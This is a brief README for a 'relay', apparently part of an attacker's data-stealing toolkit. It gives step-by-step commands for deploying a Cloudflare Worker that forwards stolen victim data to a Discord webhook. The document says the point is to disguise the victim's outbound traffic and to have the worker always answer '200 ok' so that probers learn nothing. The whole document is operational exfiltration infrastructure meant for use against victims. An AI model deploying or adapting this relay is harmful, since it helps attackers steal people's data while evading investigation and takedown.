# relay

Optional. Skip it and you post straight to `discord.com`. Use it and the
victim's outbound domain is yours instead.

1. `npm i -g wrangler && wrangler login`
2. Put `worker.js` into a project folder and `cd` there
3. Edit `PASS` and `HOOK` at the top (or use secrets:
   `wrangler secret put PASS` / `wrangler secret put HOOK`)
4. `wrangler deploy`
5. Your victim-side webhook becomes `https://relay.<you>.workers.dev/h`

The worker always answers `200 ok` so a prober learns nothing.
